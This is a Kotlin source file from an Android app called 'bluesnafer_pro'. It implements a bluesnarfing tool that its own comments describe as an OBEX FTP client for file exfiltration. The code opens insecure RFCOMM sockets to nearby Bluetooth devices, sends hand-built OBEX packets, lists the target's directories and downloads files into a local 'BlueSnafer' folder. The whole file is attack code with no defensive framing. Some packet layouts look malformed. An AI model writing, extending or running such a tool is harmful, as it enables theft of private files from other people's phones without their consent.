package com.bluesnafer_pro

import android.bluetooth.*
import android.os.Build
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

/**
 * Real OBEX FTP client for file exfiltration
 */
object RealFileExfiltrationClient {
    private const val TAG = "RealFileExfiltration"
    private val OBEX_FTP_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
    private val executor = Executors.newCachedThreadPool()
    
    /**
     * Attempt to connect to OBEX FTP service and list root directory
     */
    fun attemptFileConnection(device: BluetoothDevice, onLog: (String) -> Unit): Map<String, Any> {
        Log.d(TAG, "Attempting OBEX FTP connection to ${device.address}")
        onLog("[OBEX] Connecting to OBEX FTP service...")
        
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
            socket.connect()
            onLog("[OBEX] ✓ Connected to OBEX FTP")
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Send OBEX CONNECT
            val connectPacket = byteArrayOf(
                0x80.toByte(), // Connect
                0x00, 0x07, // Packet length: 7
                0x10, // OBEX version 1.0
                0x00, // Flags
                0x20, 0x00  // Max packet length: 8192
            )
            
            output.write(connectPacket)
            output.flush()
            
            // Read response
            val response = ByteArray(1024)
            val bytesRead = input.read(response)
            
            if (bytesRead > 0) {
                val responseCode = response[0].toInt() and 0xFF
                if (responseCode == 0xA0) { // Success
                    onLog("[OBEX] ✓ OBEX connection established")
                    
                    // Try to list root directory
                    val listPacket = byteArrayOf(
                        0xC6.toByte(), // SetPath
                        0x00, 0x03, // Length
                        0x02, // Flags: go back to root
                        0x00  // No headers
                    )
                    
                    output.write(listPacket)
                    output.flush()
                    Thread.sleep(100)
                    
                    // Request folder listing
                    val getPacket = byteArrayOf(
                        0x83.toByte(), // Get
                        0x00, 0x08, // Length
                        0x01, // Count header
                        0x00, 0x05, // Length
                        0x00, 0x01  // Count = 1
                    )
                    
                    output.write(getPacket)
                    output.flush()
                    
                    Thread.sleep(200)
                    val listResponse = ByteArray(4096)
                    val listBytes = input.read(listResponse)
                    
                    val files = mutableListOf<Map<String, Any>>()
                    if (listBytes > 0) {
                        onLog("[OBEX] ✓ Found ${listBytes} bytes of directory data")
                        // Parse simple file listing
                        val data = String(listResponse, 0, listBytes, Charsets.UTF_8)
                        val lines = data.split("\n").filter { it.isNotBlank() && it.length > 2 }
                        for (line in lines.take(50)) {
                            files.add(mapOf(
                                "name" to line.trim(),
                                "size" to "unknown",
                                "type" to "file"
                            ))
                        }
                    }
                    
                    socket.close()
                    return mapOf(
                        "success" to true,
                        "files" to files,
                        "count" to files.size
                    )
                } else {
                    onLog("[OBEX] ✗ OBEX connect failed: ${responseCode.toString(16)}")
                    socket.close()
                    return mapOf("success" to false, "error" to "OBEX connect failed: $responseCode")
                }
            } else {
                onLog("[OBEX] ✗ No response from OBEX service")
                socket.close()
                return mapOf("success" to false, "error" to "No response")
            }
        } catch (e: Exception) {
            Log.e(TAG, "OBEX connection error: ${e.message}")
            onLog("[OBEX] ✗ Connection failed: ${e.message}")
            return mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
        }
    }
    
    /**
     * List directory contents via OBEX FTP
     */
    fun listDirectory(device: BluetoothDevice, dirPath: String, onLog: (String) -> Unit, callback: (List<String>?) -> Unit): Map<String, Any> {
        Log.d(TAG, "Listing directory: $dirPath")
        onLog("[OBEX] Listing directory: $dirPath")
        
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
            socket.connect()
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Connect
            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00))
            output.flush()
            input.read(ByteArray(1024))
            
            // Set path if not root
            if (dirPath != "/" && dirPath.isNotEmpty()) {
                val pathBytes = dirPath.toByteArray(Charsets.UTF_8)
                val setPathPacket = ByteArray(5 + pathBytes.size)
                setPathPacket[0] = 0xC6.toByte() // SetPath
                setPathPacket[1] = ((5 + pathBytes.size) shr 8).toByte()
                setPathPacket[2] = ((5 + pathBytes.size) and 0xFF).toByte()
                setPathPacket[3] = 0x00 // Flags
                setPathPacket[4] = 0x00 // No constants
                System.arraycopy(pathBytes, 0, setPathPacket, 5, pathBytes.size)
                
                output.write(setPathPacket)
                output.flush()
                Thread.sleep(100)
                input.read(ByteArray(1024))
            }
            
            // List directory - simplified approach
            onLog("[OBEX] Reading directory contents...")
            val files = mutableListOf<String>()
            
            // Try to get folder listing using simplified OBEX
            try {
                val getPacket = byteArrayOf(
                    0x83.toByte(), // Get
                    0x00, 0x0C, // Length
                    0x01, // Count header
                    0x00, 0x09, // Length
                    0x00, 0x00, 0x00, 0x01, // Count = 1
                    0x42, // Name header
                    0x00, 0x03, // Length
                    0x00  // Empty name
                )
                
                output.write(getPacket)
                output.flush()
                
                Thread.sleep(300)
                val buffer = ByteArray(8192)
                val bytesRead = input.read(buffer)
                
                if (bytesRead > 0) {
                    // Try to parse XML-like folder listing
                    val content = String(buffer, 0, bytesRead, Charsets.UTF_8)
                    onLog("[OBEX] Received ${bytesRead} bytes of directory data")
                    
                    // Extract filenames from XML tags
                    val pattern = "<name>(.*?)</name>".toRegex()
                    val matches = pattern.findAll(content)
                    for (match in matches) {
                        val fileName = match.groupValues[1].trim()
                        if (fileName.isNotEmpty()) {
                            files.add(fileName)
                        }
                    }
                    
                    if (files.isEmpty() && content.contains("<?xml")) {
                        // Try alternative parsing
                        val lines = content.split(Regex("[<>\\n]")).filter { it.contains(".") }
                        files.addAll(lines.map { it.trim() }.filter { it.length > 3 })
                    }
                }
            } catch (e: Exception) {
                onLog("[OBEX] Directory parse error: ${e.message}")
            }
            
            socket.close()
            callback(files)
            
            return mapOf(
                "success" to true,
                "files" to files,
                "count" to files.size
            )
        } catch (e: Exception) {
            Log.e(TAG, "List directory error: ${e.message}")
            onLog("[OBEX] ✗ Failed to list directory: ${e.message}")
            callback(emptyList())
            return mapOf("success" to false, "error" to (e.message ?: "Unknown error"), "files" to emptyList<String>())
        }
    }
    
    /**
     * Download a file via OBEX FTP
     */
    fun downloadFile(device: BluetoothDevice, fileName: String, onLog: (String) -> Unit): Map<String, Any> {
        Log.d(TAG, "Downloading file: $fileName")
        onLog("[OBEX] Downloading: $fileName")
        
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(OBEX_FTP_UUID)
            socket.connect()
            
            val input = socket.inputStream
            val output = socket.outputStream
            
            // Connect
            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00))
            output.flush()
            input.read(ByteArray(1024))
            
            // Get file
            val nameBytes = fileName.toByteArray(Charsets.UTF_8)
            val packet = ByteArray(7 + nameBytes.size)
            packet[0] = 0x83.toByte() // Get
            packet[1] = ((7 + nameBytes.size) shr 8).toByte()
            packet[2] = ((7 + nameBytes.size) and 0xFF).toByte()
            packet[3] = 0x01 // Name header
            packet[4] = ((nameBytes.size + 3) shr 8).toByte()
            packet[5] = ((nameBytes.size + 3) and 0xFF).toByte()
            packet[6] = 0x00 // Null terminator
            System.arraycopy(nameBytes, 0, packet, 7, nameBytes.size)
            
            output.write(packet)
            output.flush()
            
            Thread.sleep(200)
            
            // Read response
            val fileData = ByteArrayOutputStream()
            val buffer = ByteArray(4096)
            var bytesRead: Int
            var totalBytes = 0
            
            do {
                bytesRead = input.read(buffer)
                if (bytesRead > 0) {
                    fileData.write(buffer, 0, bytesRead)
                    totalBytes += bytesRead
                }
            } while (bytesRead > 0 && totalBytes < 10_000_000) // Max 10MB
            
            socket.close()
            
            if (totalBytes > 0) {
                // Save file
                val downloadsDir = File("/storage/emulated/0/Download/BlueSnafer")
                if (!downloadsDir.exists()) {
                    downloadsDir.mkdirs()
                }
                
                val localFile = File(downloadsDir, fileName.substringAfterLast("/"))
                FileOutputStream(localFile).use { fos ->
                    fos.write(fileData.toByteArray())
                }
                
                onLog("[OBEX] ✓ Downloaded: ${localFile.name} (${totalBytes} bytes)")
                return mapOf(
                    "success" to true,
                    "file" to fileName,
                    "size" to totalBytes,
                    "localPath" to localFile.absolutePath
                )
            } else {
                onLog("[OBEX] ✗ No data received for: $fileName")
                return mapOf("success" to false, "error" to "No data received")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Download error: ${e.message}")
            onLog("[OBEX] ✗ Download failed: ${e.message}")
            return mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
        }
    }
}
